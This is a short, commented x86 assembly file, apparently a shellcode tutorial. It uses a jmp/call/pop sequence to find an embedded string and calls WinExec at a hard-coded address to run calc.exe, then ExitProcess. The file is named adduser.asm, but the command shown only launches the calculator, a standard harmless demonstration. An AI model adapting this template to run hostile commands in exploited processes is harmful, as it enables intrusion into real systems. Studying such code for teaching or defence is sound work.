;adduser.asm
[Section .text]

BITS 32

global _start

_start:

add esp, 0xffffff11 ;Move esp back up so WinExec doesn't overwrite our buffer
sub esp, 0xffffff69
jmp short GetCommand ;jump to the location of the command string
CommandReturn: ;Define a label to call so that string address is pushed onto stack
    pop ebx ;ebx now points to the string

    xor eax,eax ;empties out eax
    push eax ;push null onto stack as empty parameter value
    mov [ebx + 8],al ;insert the NULL character
    push ebx ;push the command string onto the stack
    mov ebx,0x7c86250d ;place address of WinExec into ebx
    call ebx ;call WinExec(path,showcode)

    xor eax,eax ;zero the register again to clear WinExec return value (return values are often returned into eax)
    push eax ;push null onto stack as empty parameter value
    mov ebx,0x7c81cb12 ;place address of ExitProcess into ebx
    call ebx ;call ExitProcess(0);

GetCommand: ;Define label for location of command string
    call CommandReturn ;call the return label so the return address (location of string) is pushed onto stack
    db "calc.exeN" ;Write the raw bytes into the shellcode that represent our string.
